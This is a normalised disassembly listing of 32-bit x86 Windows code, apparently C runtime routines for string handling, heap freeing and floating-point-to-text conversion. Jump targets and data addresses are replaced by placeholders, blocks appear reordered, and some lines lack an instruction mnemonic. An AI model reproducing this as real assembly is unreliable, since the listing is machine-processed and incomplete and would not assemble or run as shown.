movsx ebx [ eax ]
inc eax
add esi ebx
cmp eax edx
jne r-xdata
xor esi esi
cmp eax edx
je r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x3f
add eax ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
div [ ecx + 0x108 ]
pop edi
pop esi
pop ebx
mov eax edx
mov esp ebp
pop ebp
retn 0x8
dec eax
or eax 0xffffffc0
inc eax
movsx esi [ ecx ]
inc ecx
add eax esi
cmp ecx edx
jne r-xdata
mov esi [ ecx + 0x14 ]
cmp esi 0x10
jb r-xdata
mov ebx [ ebp + 0xc ]
sub_1002a68d
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100420d4
add esp 0x14
pop ebp
retn 0x10
sub_1002a6b0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
xor eax eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_10051390
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002a6e0
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
push eax
push edx
call sub_1005be50
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_100172f0
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_1002a730
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ecx ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100067d1
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_1002470e
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_1002a780
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x90 ] edi
call sub_10027cf0
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x7c ]
push edx
mov [ ebp - 0x7c ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
jge r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
lea edx [ ebp - 0x80 ]
mov [ ebp - 0x80 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x80 ]
cmp eax ebx
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ ebp - 0x8c ] ecx
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xc0
call sub_1000a6f0
jmp r-xdata
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
lea esi [ ebp - 0x84 ]
push esi
mov [ ebp - 0x84 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
mov edi [ ebp - 0x84 ]
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x67
lea ecx [ ebp - 0x88 ]
push ecx
mov [ ebp - 0x88 ] ebx
call sub_1003da90
mov esi [ ebp - 0x88 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x8c ]
inc ecx
mov [ ebp - 0x8c ] ecx
cmp ecx [ ebp - 0x80 ]
jl r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x90 ]
push esi
add eax 0x12c
call sub_10028a90
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x84 ]
cmp eax ebx
je r-xdata
mov eax esi
call sub_10054700
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x127
jmp r-xdata
call sub_10012830
call sub_1000a6f0
sub_1002a905
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_1002ae60
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x98
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ecx
mov ecx [ ebp + 0x8 ]
mov edi eax
call sub_10019410
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x18
sub_1002aee3
push 0x38
mov eax sub_1007e8a6
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1004770a
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10045daa
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1002afa0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0xc ]
cmp ecx 0xffffffff
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0x10 ]
add [ esi ] eax
add [ esi + 0x1c ] eax
push edi
mov edi [ esi ]
cmp ecx 0xa
jne r-xdata
cmp ecx 0x9
jne r-xdata
mov eax 0x1
add [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
jmp r-xdata
inc [ esi + 0x18 ]
mov eax [ esi + 0x2c ]
mov ecx [ eax ]
mov ecx [ ecx + 0xc ]
mov eax [ esi + 0x18 ]
xor edx edx
div ecx
inc eax
imul eax ecx
mov [ esi + 0x18 ] eax
jmp r-xdata
cmp edi [ esi + 0x8 ]
pop edi
jae r-xdata
mov [ esi + 0xc ] 0xffffffff
call sub_100776f0
pop esi
pop ebp
retn
sub_1002b004
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b659
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
